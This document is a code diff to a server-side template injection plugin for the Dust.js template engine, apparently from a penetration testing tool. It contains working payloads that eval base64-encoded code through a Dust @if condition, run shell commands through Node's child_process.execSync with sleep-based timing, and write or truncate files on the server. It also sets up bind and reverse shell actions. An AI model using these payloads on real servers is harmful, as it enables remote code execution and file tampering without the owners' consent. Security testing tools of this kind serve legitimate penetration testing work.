@@ -1,58 +1,46 @@
 from utils.strings import quote, chunkit, md5
 from utils.loggers import log
-from core import languages
-from core.plugin import Plugin
+from plugins.languages import javascript
 from utils import rand
+from plugins.languages import bash
 import base64
 import re
 
 
-class Dust(Plugin):
+class Dust(javascript.Javascript):
+    
+    def init(self):
 
-    actions = {
-        'blind' : {
-            'call': 'execute_blind',
-            'bool_true' : 'true',
-            'bool_false' : 'false'
-        },
-        'evaluate' : {
-            'call': 'inject',
-            'evaluate': """{@if cond=\"eval(Buffer('%(code_b64)s', 'base64').toString())\"}{/if}"""
-        },
-        # Not using execute here since it's rendered and requires set headers and trailers
-        'execute_blind' : {
-            'call': 'evaluate',
-            # execSync() has been introduced in node 0.11, so this will not work with old node versions.
-            # TODO: use another function.
-            'execute_blind': """require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString() + ' && sleep %(delay)i');"""
-        },
-        'bind_shell' : {
-            'call' : 'execute_blind',
-            'bind_shell': languages.bash_bind_shell
-        },
-        'reverse_shell' : {
-            'call': 'execute_blind',
-            'reverse_shell' : languages.bash_reverse_shell
-        },
-        'write' : {
-            'call' : 'evaluate',
-            'write' : """require('fs').appendFileSync('%(path)s', Buffer('%(chunk_b64)s', 'base64'), 'binary')""",
-            'truncate' : """require('fs').writeFileSync('%(path)s', '')"""
-        },
-    }
+        self.update_actions({
+            'evaluate' : {
+                'call': 'inject',
+                'evaluate': """{@if cond=\"eval(Buffer('%(code_b64)s', 'base64').toString())\"}{/if}"""
+            },
+            'write' : {
+                'call' : 'evaluate',
+                'write' : """require('fs').appendFileSync('%(path)s', Buffer('%(chunk_b64)s', 'base64'), 'binary')""",
+                'truncate' : """require('fs').writeFileSync('%(path)s', '')"""
+            },
+            # Not using execute here since it's rendered and requires set headers and trailers
+            'execute_blind' : {
+                'call': 'evaluate',
+                # execSync() has been introduced in node 0.11, so this will not work with old node versions.
+                # TODO: use another function.
+                'execute_blind': """require('child_process').execSync(Buffer('%(code_b64)s', 'base64').toString() + ' && sleep %(delay)i');""",
+                'test_cmd': bash.echo % { 's1': rand.randstrings[2] },
+                'test_cmd_expected': rand.randstrings[2] 
+            }
+        })
 
-    contexts = [
-
-        # Text context, no closures. This covers also {%s} e.g. {{payload}} seems working.
-        { 'level': 0 },
-        
-        # Block as {#key}{/key} and similar needs tag key name to be bypassed.
-        
-        # Comment blocks
-        { 'level': 1, 'prefix' : '!}', 'suffix' : '{!' },
-    ]
-
-    language = 'javascript'
+        self.set_contexts([
+                # Text context, no closures. This covers also {%s} e.g. {{payload}} seems working.
+                { 'level': 0 },
+                
+                # Block as {#key}{/key} and similar needs tag key name to be bypassed.
+                
+                # Comment blocks
+                { 'level': 1, 'prefix' : '!}', 'suffix' : '{!' },
+            ])
 
     """
     This replace _detect_render() since there is no real rendered evaluation in Dust.
@@ -67,13 +55,13 @@ class Dust(Plugin):
 
         for prefix, suffix in self._generate_contexts():
 
-            payload = '{!c!}'
+            payload = 'AA{!c!}AA'
             header_rand = rand.randint_n(10)
             header = str(header_rand)
             trailer_rand = rand.randint_n(10)
             trailer = str(trailer_rand)
 
-            if '' == self.render(
+            if 'AAAA' == self.render(
                     code = payload,
                     header = header,
                     trailer = trailer,
@@ -144,11 +132,17 @@ class Dust(Plugin):
 
 
     def blind_detected(self):
-
+        
         # Blind has been detected so code has been already evaluated
         self.set('evaluate_blind', self.language)
 
-        if self.execute_blind('echo %s' % str(rand.randint_n(2))):
+        test_cmd_code = self.actions.get('execute_blind', {}).get('test_cmd')
+
+        if (
+            test_cmd_code and
+            # self.execute_blind() returns true or false
+            self.execute_blind(test_cmd_code)
+            ):
             self.set('execute_blind', True)
             self.set('write', True)
             self.set('bind_shell', True)
